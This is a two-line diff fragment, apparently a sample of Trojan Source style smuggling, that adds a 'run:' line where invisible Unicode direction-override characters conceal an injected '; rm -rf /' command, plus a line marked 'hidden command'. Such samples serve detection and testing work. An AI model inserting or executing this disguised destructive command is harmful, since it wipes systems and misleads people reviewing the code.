@@ -1,0 +1,2 @@
+run: ‮ ; rm -rf /‬ now
+⁦hidden⁩ command
